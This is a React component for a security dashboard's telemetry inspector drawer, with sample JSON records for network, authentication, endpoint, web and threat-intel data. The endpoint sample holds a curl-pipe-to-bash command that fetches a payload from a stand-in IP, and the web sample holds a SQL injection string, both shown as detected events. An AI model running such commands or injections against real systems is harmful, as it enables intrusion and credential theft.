import React, { useState } from 'react';
import { 
  X, 
  Layers, 
  Network, 
  KeyRound, 
  Terminal, 
  Globe, 
  Database, 
  Copy, 
  Check, 
  CheckCircle2, 
  Cpu
} from 'lucide-react';

const MODALITIES = [
  {
    id: 'network',
    title: 'Network Flows (PCAP / NetFlow)',
    icon: Network,
    rate: '1,240 pkts/sec',
    status: 'Active',
    description: 'High-speed layer 3/4 flow headers analyzed by Stage 1 XGBoost.',
    sample: {
      timestamp: '2026-10-10T14:40:15.012Z',
      src_ip: '10.0.4.12',
      dst_ip: '192.168.1.1',
      dst_port: 443,
      protocol: 'TCP',
      flow_duration_us: 12450,
      tot_fwd_pkts: 4500,
      tot_bwd_pkts: 12,
      fwd_pkt_len_max: 1460,
      init_fwd_win_bytes: 64240,
      xgboost_flag: 1
    }
  },
  {
    id: 'auth',
    title: 'Authentication & IAM Logs',
    icon: KeyRound,
    rate: '14 events/min',
    status: 'Active',
    description: 'Kerberos, SSH, LDAP, and Okta identity authentication audit events.',
    sample: {
      timestamp: '2026-10-10T14:39:58.110Z',
      user: 'svc_database_backup',
      auth_mechanism: 'SSH_PUBKEY',
      status: 'FAILED',
      failed_attempts_window: 8,
      source_host: '198.51.100.89',
      target_resource: 'PROD_DB_PRIMARY',
      risk_score: 0.88
    }
  },
  {
    id: 'endpoint',
    title: 'Endpoint Syslog (OSQuery)',
    icon: Terminal,
    rate: '94 logs/sec',
    status: 'Active',
    description: 'Host-level process trees, system call traces, and file access events.',
    sample: {
      timestamp: '2026-10-10T14:40:02.450Z',
      host: 'MAC-EDGE-01',
      os: 'macOS 15.3 (Darwin 24.3.0)',
      process_name: 'curl',
      pid: 48921,
      parent_pid: 1420,
      command_line: 'curl -s http://198.51.100.89/payload.sh | bash',
      mitre_technique: 'T1059.004 Unix Shell'
    }
  },
  {
    id: 'web',
    title: 'Web & API Access Logs',
    icon: Globe,
    rate: '45 req/sec',
    status: 'Active',
    description: 'NGINX ingress and API gateway telemetry for Layer 7 injection detection.',
    sample: {
      timestamp: '2026-10-10T14:39:45.882Z',
      method: 'POST',
      uri: '/api/v1/transfer',
      http_status: 403,
      user_agent: 'sqlmap/1.7.2#stable',
      payload_signature: "UNION SELECT NULL, username, password_hash FROM users--",
      waf_status: 'BLOCKED'
    }
  },
  {
    id: 'threat_intel',
    title: 'Threat Intelligence (IOC Sync)',
    icon: Database,
    rate: 'Hourly Sync',
    status: 'Synced',
    description: 'Collaborative MISP & MITRE ATT&CK indicators exchanged across federation.',
    sample: {
      last_sync: '2026-10-10T14:00:00Z',
      active_iocs: 14250,
      emerging_zero_day_signatures: 3,
      federated_peers_contributing: 4,
      differential_privacy_noise: 'Laplace(0, 0.05)'
    }
  }
];

export default function MultiModalDrawer({ isOpen, onClose }) {
  const [selectedId, setSelectedId] = useState('network');
  const [copied, setCopied] = useState(false);

  const selectedModality = MODALITIES.find(m => m.id === selectedId) || MODALITIES[0];

  const handleCopy = () => {
    navigator.clipboard.writeText(JSON.stringify(selectedModality.sample, null, 2));
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex">
      {/* Backdrop */}
      <div 
        onClick={onClose}
        className="fixed inset-0 bg-black/70 backdrop-blur-sm transition-opacity"
      ></div>

      {/* Drawer Panel */}
      <div className="relative w-full max-w-lg bg-[#0a0c10] border-r border-[#1a1e27] h-full shadow-2xl flex flex-col z-10 animate-in slide-in-from-left duration-300">
        {/* Header */}
        <div className="flex items-center justify-between p-5 border-b border-[#1a1e27]">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400">
              <Layers className="w-5 h-5" />
            </div>
            <div>
              <h3 className="text-sm font-bold text-white tracking-tight">
                Multi-Modal Ingestion Inspector
              </h3>
              <p className="text-[11px] text-gray-500">
                Edge Telemetry Streams & Payload Schemas
              </p>
            </div>
          </div>

          <button 
            onClick={onClose}
            className="w-8 h-8 rounded-lg bg-[#12151c] hover:bg-[#1a1f29] text-gray-400 hover:text-white flex items-center justify-center transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Modality Selector List */}
        <div className="p-4 border-b border-[#1a1e27] space-y-2 bg-[#07080b]">
          <span className="text-[10px] text-gray-500 font-semibold uppercase tracking-wider block mb-1">
            Active Data Modalities
          </span>
          <div className="space-y-1.5">
            {MODALITIES.map((mod) => {
              const Icon = mod.icon;
              const isSelected = mod.id === selectedId;

              return (
                <div
                  key={mod.id}
                  onClick={() => setSelectedId(mod.id)}
                  className={`flex items-center justify-between p-2.5 rounded-xl cursor-pointer border transition-all ${
                    isSelected
                      ? 'bg-[#121620] border-blue-500/40 text-white shadow-sm'
                      : 'bg-[#0d0f12] border-[#181c24] text-gray-400 hover:border-gray-700 hover:text-gray-200'
                  }`}
                >
                  <div className="flex items-center gap-2.5 truncate">
                    <Icon className={`w-4 h-4 flex-shrink-0 ${isSelected ? 'text-blue-400' : 'text-gray-500'}`} />
                    <span className="text-xs font-medium truncate">{mod.title}</span>
                  </div>

                  <div className="flex items-center gap-2 flex-shrink-0">
                    <span className="text-[10px] font-mono text-gray-400">{mod.rate}</span>
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Selected Modality Inspector & JSON Preview */}
        <div className="flex-1 overflow-y-auto p-5 space-y-4">
          <div>
            <div className="flex items-center justify-between mb-1">
              <h4 className="text-xs font-bold text-white uppercase tracking-wider">
                {selectedModality.title}
              </h4>
              <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">
                {selectedModality.status}
              </span>
            </div>
            <p className="text-xs text-gray-400 leading-relaxed">
              {selectedModality.description}
            </p>
          </div>

          {/* Raw JSON Schema Preview */}
          <div className="bg-[#050608] border border-[#181c24] rounded-xl overflow-hidden shadow-inner">
            <div className="flex items-center justify-between px-3.5 py-2 bg-[#0c0e13] border-b border-[#181c24]">
              <span className="text-[10px] font-mono text-gray-400 flex items-center gap-1.5">
                <Cpu className="w-3 h-3 text-blue-400" />
                Raw Edge Telemetry JSON Payload
              </span>

              <button
                onClick={handleCopy}
                className="flex items-center gap-1 text-[10px] text-gray-400 hover:text-white px-2 py-0.5 rounded bg-[#161a22] hover:bg-[#1f2430] transition-colors"
              >
                {copied ? (
                  <>
                    <Check className="w-3 h-3 text-emerald-400" />
                    <span className="text-emerald-400">Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3 h-3" />
                    <span>Copy JSON</span>
                  </>
                )}
              </button>
            </div>

            <pre className="p-4 text-[11px] font-mono text-emerald-400/90 leading-relaxed overflow-x-auto selection:bg-emerald-500/30">
              {JSON.stringify(selectedModality.sample, null, 2)}
            </pre>
          </div>

          <div className="p-3 bg-[#101319] border border-[#1c222e] rounded-xl text-xs text-gray-400 space-y-1">
            <div className="flex items-center gap-2 text-white font-medium">
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
              <span>Feature Normalization Active</span>
            </div>
            <p className="text-[11px] text-gray-500">
              Raw network packet structures are mapped into the exact 15-feature numeric tensor expected by XGBoost Stage 1 before narrative serialization.
            </p>
          </div>
        </div>

        {/* Footer */}
        <div className="p-4 border-t border-[#1a1e27] bg-[#07080b] flex justify-end">
          <button
            onClick={onClose}
            className="px-4 py-2 rounded-xl bg-[#141822] hover:bg-[#1e2330] text-xs font-semibold text-gray-300 hover:text-white transition-colors"
          >
            Close Inspector
          </button>
        </div>
      </div>
    </div>
  );
}
